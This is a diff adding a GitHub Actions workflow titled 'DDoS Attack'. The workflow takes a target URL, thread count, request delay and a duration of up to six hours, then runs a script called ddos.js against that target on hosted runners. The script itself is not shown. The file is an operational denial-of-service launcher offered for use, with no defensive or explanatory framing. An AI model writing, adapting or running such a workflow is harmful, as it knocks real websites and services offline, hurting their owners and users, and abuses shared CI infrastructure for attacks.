@@ -1,0 +1,44 @@
+name: DDoS Attack
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: 'Target URL'
+        required: true
+        type: string
+      threads:
+        description: 'Number of threads'
+        required: false
+        type: string
+        default: '500'
+      request_delay:
+        description: 'Request delay in ms'
+        required: false
+        type: string
+        default: '10'
+      duration:
+        description: 'Duration in minutes (max 360)'
+        required: false
+        type: string
+        default: '360'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node-version: [18.x]
+      max-parallel: 20
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: ${{ matrix.node-version }}
+
+      - name: Execute DDoS script
+        run: node ddos.js ${{ github.event.inputs.target_url }} ${{ github.event.inputs.threads }} ${{ github.event.inputs.request_delay }} ${{ github.event.inputs.duration }}
